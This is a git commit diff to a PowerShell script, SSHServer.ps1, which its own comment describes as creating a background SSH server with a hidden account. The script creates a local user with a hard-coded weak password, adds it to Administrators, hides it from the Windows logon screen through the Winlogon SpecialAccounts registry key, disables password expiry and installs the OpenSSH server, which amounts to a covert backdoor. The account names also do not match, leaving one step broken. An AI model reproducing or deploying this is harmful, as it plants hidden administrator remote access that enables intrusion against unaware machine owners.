7bdd4abc5883d8e00fe95c11a24b5e65872eab58
DevHrefTry <58010750+DevHrefTry@users.noreply.github.com>
2019-11-20 22:55:36 +0100

    Update SSHServer.ps1

--- SSHServer.ps1
+++ SSHServer.ps1
@@ -1,9 +1,11 @@
+# This script will create backround ssh server with hidden account.
+$acc = "Acount"
 $password = ConvertTo-SecureString "password" -AsPlainText -Force
-New-LocalUser "Account" -Password $password -FullName "SSH"
-Add-LocalGroupMember -Group "Administrators" -Member "SSH"
+New-LocalUser $acc -Password $password -FullName $acc
+Add-LocalGroupMember -Group "Administrators" -Member $acc
 $path = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
-New-Item $path -Force | New-ItemProperty -Name "SSH" -Value 0 -PropertyType DWord -Force
-Set-LocalUser -Name "SSH" -PasswordNeverExpires 1
+New-Item $path -Force | New-ItemProperty -Name $acc -Value 0 -PropertyType DWord -Force
+Set-LocalUser -Name "Account" -PasswordNeverExpires 1
 Get-WindowsCapability -Online | ? Name -like 'OpenSSH*'
 Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
